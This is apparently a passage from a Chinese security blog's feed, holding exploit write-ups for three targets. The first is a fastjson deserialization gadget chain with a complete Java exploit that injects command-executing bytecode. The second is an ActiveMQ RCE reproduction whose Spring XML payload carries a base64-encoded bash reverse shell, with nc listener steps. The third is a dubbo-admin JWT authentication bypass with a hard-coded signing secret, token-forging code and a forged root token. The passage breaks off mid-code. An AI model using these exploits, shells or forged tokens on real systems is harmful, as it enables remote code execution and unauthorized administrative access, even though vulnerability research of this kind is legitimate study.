alt="image-20240113214817756"></p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;JavaBeanSerializer.java#getFieldValuesMap()</p><p><img src="image-20240113214317673.png" alt="image-20240113214317673"></p><p><img src="image-20240113215040174.png" alt="image-20240113215040174"></p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;FieldSerializer.java#getPropertyValue</p><p><img src="image-20240113215230955.png" alt="image-20240113215230955"></p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;util&#x2F;FieldInfo.java#get()</p><p><img src="image-20240113215539479.png" alt="image-20240113215539479"></p><p>最后对里面的所有javabean属性值invoke。</p><h4 id="json-调用（看不懂，贴流程吧）"><a href="#json-调用（看不懂，贴流程吧）" class="headerlink" title="json 调用（看不懂，贴流程吧）"></a>json 调用（看不懂，贴流程吧）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">getData:40, jacksonTest$Message (com.jsonser)<br>write:-1, ASMSerializer_1_Message (com.alibaba.fastjson.serializer)<br>write:285, JSONSerializer (com.alibaba.fastjson.serializer)<br>toJSONString:758, JSON (com.alibaba.fastjson)<br>toJSONString:696, JSON (com.alibaba.fastjson)<br>toJSONString:661, JSON (com.alibaba.fastjson)<br>main:64, jacksonTest (com.jsonser)<br></code></pre></td></tr></table></figure><p>Json.toString()细节分析</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;JSON.java#toJSONString()</p><p><img src="image-20240114013846724.png" alt="image-20240114013846724"></p><p><img src="image-20240114013851659.png" alt="image-20240114013851659"></p><p>对out,config赋值。</p><p><img src="image-20240114013930510.png" alt="image-20240114013930510"></p><p>然后调用write处理传入的object</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;JSONSerializer.java#write()</p><p><img src="image-20240114023637460.png" alt="image-20240114023637460"></p><p><img src="image-20240114025044834.png" alt="image-20240114025044834"></p><p>进过一系列操作创建createJavaBeanSerializer</p><p><img src="image-20240114025145400.png" alt="image-20240114025145400"></p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;SerializeConfig.java#createJavaBeanSerializer()</p><p><img src="image-20240114025509056.png" alt="image-20240114025509056"></p><p>从class获取所有bean属性值，然后传入createJavaBeanSerializer(beanInfo)</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;SerializeConfig.java#createJavaBeanSerializer(beanInfo)</p><p><img src="image-20240114025943928.png" alt="image-20240114025943928"></p><p>然后得到bean中field，bean中的method</p><p><img src="image-20240114030745435.png" alt="image-20240114030745435"></p><p>自后调用createASMSerializer(beanInfo)</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;SerializeConfig.java#createASMSerializer(SerializeBeanInfo beanInfo)</p><p><img src="image-20240114031455047.png" alt="image-20240114031455047"></p><p>调用</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;ASMSerializerFactory.javacreateJavaBeanSerializer(SerializeBeanInfo beanInfo) </p><p><img src="image-20240114033041907.png" alt="image-20240114033041907"></p><p>然后获取对象getters</p><p>后面看不懂，总结就是序列化会调用对象中的所有getters。</p><h3 id="0x03-构造"><a href="#0x03-构造" class="headerlink" title="0x03 构造"></a>0x03 构造</h3><p>只要找一个可以ser的类里面触发toJSONString就可以。</p><p><img src="image-20240114034001775.png" alt="image-20240114034001775"></p><p><img src="image-20240114033937897.png" alt="image-20240114033937897"></p><p>下面两个都继承Json,没有toString方法，所以调用两个类的toString，就回触发Json的toString，进而触发toJSONString。</p><p><img src="image-20240114033713273.png" alt="image-20240114033713273"></p><p><img src="image-20240114033742693.png" alt="image-20240114033742693"></p><h3 id="0x04-exp-1"><a href="#0x04-exp-1" class="headerlink" title="0x04 exp"></a>0x04 exp</h3><p>找一个readObject触发toString方法。然后把触发对象改为JSONObject或者JSONArray就行</p><p>cc5的前半就满足这个条件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsonser;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        cmd.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">Command</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open .\&quot;);&quot;</span>;<br>        cmd.makeClassInitializer().insertBefore(Command);<br>        cmd.toClass();<br><span class="hljs-comment">//        CtConstructor ctConstructor = new CtConstructor(new CtClass[]&#123;&#125;, cmd);</span><br><span class="hljs-comment">//        ctConstructor.setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;);</span><br><span class="hljs-comment">//        cmd.addConstructor(ctConstructor);</span><br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cmd.toBytecode()&#125;;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);<br><br><span class="hljs-comment">//        JSONArray objects = new JSONArray();</span><br><span class="hljs-comment">//        objects.add(templates);</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;1&quot;</span>,templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val,<span class="hljs-string">&quot;val&quot;</span>,jsonObject);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(templates,val);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        oos.writeObject(hashMap);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>剑招学习完毕。脑子不够用，驻场了。。。</p><h2 id="偷学剑招-佬文链接"><a href="#偷学剑招-佬文链接" class="headerlink" title="偷学剑招(佬文链接)"></a>偷学剑招(佬文链接)</h2><p><a href="https://xz.aliyun.com/t/12509">https://xz.aliyun.com/t/12509</a></p><p><a href="https://xz.aliyun.com/t/12755">https://xz.aliyun.com/t/12755</a></p><p><a href="https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/">https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/</a></p><p><a href="http://www.bmth666.cn/2022/03/11/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRome%E9%93%BE/">http://www.bmth666.cn/2022/03/11/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRome%E9%93%BE/</a></p><p><a href="https://su18.org/post/ysoserial-su18-5/#objectbean">https://su18.org/post/ysoserial-su18-5/#objectbean</a></p><p><a href="https://tttang.com/archive/1701/#toc_beancomparator">https://tttang.com/archive/1701/#toc_beancomparator</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java-gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>activemq-rce</title>
    <link href="/2024/01/13/activemq-rce/"/>
    <url>/2024/01/13/activemq-rce/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-复现"><a href="#0x01-复现" class="headerlink" title="0x01 复现"></a>0x01 复现</h2><p>好久前的 ，同步一下</p><p>下载activemq安装包，在bin目录下启动</p><p>activemq console</p><p><img src="image-20231026183129912.png" alt="image-20231026183129912"></p><p>下载poc <a href="https://github.com/Fw-fW-fw/activemq_Throwable">https://github.com/Fw-fW-fw/activemq_Throwable</a></p><p>在 poc目录下起一个http服务</p><p>python3 -m http.server 8000</p><p>编写一个poc为反弹shell</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>  <br>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> &gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>执行的命令写在&lt;value&gt;标签内</p><p>用nc起一个监听</p><p>nc -l 8888</p><p>最后执行poc</p><p><img src="image-20231026182415885.png" alt="image-20231026182415885"></p><p>成功shell</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dubbo-admin-authorized-bypass-CNVD-2023-96546</title>
    <link href="/2024/01/10/dubbo-admin-authorized-bypass-CNVD-2023-96546/"/>
    <url>/2024/01/10/dubbo-admin-authorized-bypass-CNVD-2023-96546/</url>
    
    <content type="html"><![CDATA[<h2 id="dubbo-admin-JWT-BYPASS"><a href="#dubbo-admin-JWT-BYPASS" class="headerlink" title="dubbo-admin_JWT_BYPASS"></a>dubbo-admin_JWT_BYPASS</h2><p>Affected versions dubbo-admin 0.4-0.6</p><h2 id="0x01-analyze"><a href="#0x01-analyze" class="headerlink" title="0x01 analyze"></a>0x01 <strong>analyze</strong></h2><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;controller&#x2F;UserController.java#login()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">login</span><span class="hljs-params">(HttpServletRequest httpServletRequest, HttpServletResponse response, <span class="hljs-meta">@RequestParam</span> String userName, <span class="hljs-meta">@RequestParam</span> String password)</span> &#123;<br>       ExtensionLoader&lt;LoginAuthentication&gt; extensionLoader = ExtensionLoader.getExtensionLoader(LoginAuthentication.class);<br>       Set&lt;LoginAuthentication&gt; supportedExtensionInstances = extensionLoader.getSupportedExtensionInstances();<br>       Iterator&lt;LoginAuthentication&gt; iterator = supportedExtensionInstances.iterator();<br>       <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>       <span class="hljs-keyword">if</span> (iterator != <span class="hljs-literal">null</span> &amp;&amp; !iterator.hasNext()) &#123;<br>           <span class="hljs-keyword">if</span> (StringUtils.isBlank(rootUserName) || (rootUserName.equals(userName) &amp;&amp; rootUserPassword.equals(password))) &#123;<br>               <span class="hljs-keyword">return</span> jwtTokenUtil.generateToken(userName);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               flag = <span class="hljs-literal">false</span>;<br>           &#125;<br>       &#125;<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">直接确定用户名和密码填写即可，然后获取jwtToken<br></code></pre></td></tr></table></figure><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;utils&#x2F;JwtTokenUtil.java#generateToken()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">generateToken</span><span class="hljs-params">(String rootUserName)</span> &#123;<br>    Map&lt;String, Object&gt; claims = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">1</span>);<br>    claims.put(<span class="hljs-string">&quot;sub&quot;</span>, rootUserName);<br>    <span class="hljs-keyword">return</span> Jwts.builder()<br>            .setClaims(claims)<br>            .setExpiration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis() + expiration))<br>            .setIssuedAt(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis()))<br>            .signWith(defaultAlgorithm, secret)<br>            .compact();<br>&#125;<br></code></pre></td></tr></table></figure><p>那么这里是jwttoken的处理方式，包括认证时间、过期时间、用户名。</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;utils&#x2F;JwtTokenUtil.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">* Jwt signingKey configurable<br> */<br><span class="hljs-meta">@Value(&quot;$&#123;admin.check.signSecret:&#125;&quot;)</span><br><span class="hljs-keyword">public</span> String secret;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * token timeout configurable</span><br><span class="hljs-comment"> * default to be an hour: 1000 * 60 * 60</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Value(&quot;$&#123;admin.check.tokenTimeoutMilli:&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">long</span> expiration;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * default SignatureAlgorithm</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">SignatureAlgorithm</span> <span class="hljs-variable">defaultAlgorithm</span> <span class="hljs-operator">=</span> SignatureAlgorithm.HS512;<br></code></pre></td></tr></table></figure><p>该类定义了固定的秘密、过期、默认算法。 现在我们知道了加密方式，我们就可以使用假jwt来登录绕过了。</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;authentication&#x2F;impl&#x2F;DefaultPreHandle.java#authentication()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">authentication</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;<br>        <span class="hljs-type">HandlerMethod</span> <span class="hljs-variable">handlerMethod</span> <span class="hljs-operator">=</span> (HandlerMethod) handler;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> handlerMethod.getMethod();<br>        <span class="hljs-type">Authority</span> <span class="hljs-variable">authority</span> <span class="hljs-operator">=</span> method.getDeclaredAnnotation(Authority.class);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == authority) &#123;<br>            authority = method.getDeclaringClass().getDeclaredAnnotation(Authority.class);<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;Authorization&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != authority &amp;&amp; authority.needLogin()) &#123;<br>            <span class="hljs-comment">//check if &#x27;authorization&#x27; is empty to prevent NullPointException</span><br>            <span class="hljs-keyword">if</span> (StringUtils.isEmpty(token)) &#123;<br>                <span class="hljs-comment">//While authentication is required and &#x27;Authorization&#x27; string is missing in the request headers,</span><br>                <span class="hljs-comment">//reject this request(http403).</span><br>                AuthInterceptor.authRejectedResponse(response);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (jwtTokenUtil.canTokenBeExpiration(token)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-comment">//while user not found, or token timeout, reject this request(http401).</span><br>            AuthInterceptor.loginFailResponse(response);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以分析一下，从Authorization中获取jwt，然后确定过期时间。现在我们有办法对其进行加密，就是针对一个长期不过期的jwt。</p><h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.dubbo.admin.controller;<br><br><span class="hljs-keyword">import</span> io.jsonwebtoken.Jwts;<br><span class="hljs-keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;<br><br><span class="hljs-keyword">import</span> java.util.Date;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jwt</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateToken</span><span class="hljs-params">(String rootUserName)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">secret</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;86295dd0c4ef69a1036b0b0c15158d77&quot;</span>;<br>        <span class="hljs-type">Long</span> <span class="hljs-variable">timeStamp</span> <span class="hljs-operator">=</span> <span class="hljs-number">9999999999999L</span>;<br>        <span class="hljs-type">Date</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(timeStamp);<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">SignatureAlgorithm</span> <span class="hljs-variable">defaultAlgorithm</span> <span class="hljs-operator">=</span> SignatureAlgorithm.HS512;<br>        Map&lt;String, Object&gt; claims = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">1</span>);<br>        claims.put(<span class="hljs-string">&quot;sub&quot;</span>, rootUserName);<br>        <span class="hljs-keyword">return</span> Jwts.builder()<br>                .setClaims(claims)<br>                .setExpiration(date)<br>                .setIssuedAt(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis()))<br>                .signWith(defaultAlgorithm, secret)<br>                .compact();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> jwt.generateToken(<span class="hljs-string">&quot;root&quot;</span>);<br>        System.out.println(root);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>In this way, you can get root’s jwt.</p><p>Calculate and get</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jwt">eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjk5OTk5OTk5OTksInN1YiI6InJvb3QiLCJpYXQiOjE2OTkwODM2Mzd9.wKRqJkWxr_nVDcVVF5rniqhnACtqaDnYUUu55g-atkIwRIt1A-SMpKqBN5zrGZl4kFVcrjzMvXsYqfqf0N9Gbg<br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span 